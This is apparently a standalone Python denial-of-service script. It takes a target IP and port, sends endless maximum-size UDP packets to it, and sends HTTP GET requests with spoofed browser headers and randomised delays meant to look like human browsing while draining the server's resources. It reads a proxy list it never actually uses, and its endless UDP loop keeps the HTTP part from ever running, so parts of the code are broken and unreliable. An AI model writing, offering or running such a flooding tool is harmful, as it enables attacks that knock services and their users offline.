import socket
import random
import os
import time
import requests

# Function to read proxies from a file
def read_proxies(file):
    proxies = []
    with open(file, 'r') as f:
        for line in f:
            line = line.strip()
            if line:
                proxies.append(line)
    return proxies

# Function to generate fake headers
def generate_headers():
    headers = []
    for _ in range(30):
        headers.append({
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1'
            ]),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
    return headers

# Function to send UDP packets using a proxy
def send_udp_packets(ip, port, proxies):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        for proxy in proxies:
            try:
                proxy_ip, proxy_port = proxy.split(':')
                s.connect((ip, port))
                s.sendto(b'A' * 65535, (ip, port))
                s.close()
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            except:
                continue

# Main function
if __name__ == '__main__':
    ip = input("Enter target IP: ")
    port = int(input("Enter target port: "))
    proxies = read_proxies('proxies.txt')
    headers = generate_headers()

    # Prepare a GET request to consume the target server's resources
    target_url = f"http://{ip}:{port}/"
    request_params = {
        'param1': 'value1',
        'param2': 'value2',
    }

    while True:
        for _ in range(10):
            try:
                # Send UDP packets using a random proxy
                send_udp_packets(ip, port, proxies)

                # Send a GET request with a random header
                random_header = random.choice(headers)
                response = requests.get(
                    target_url,
                    params=request_params,
                    headers=random_header
                )

                # Add delay to simulate human-like browsing
                time.sleep(random.uniform(0.5, 1.5))
            except Exception as e:
                print(f"Error: {e}")
                continue
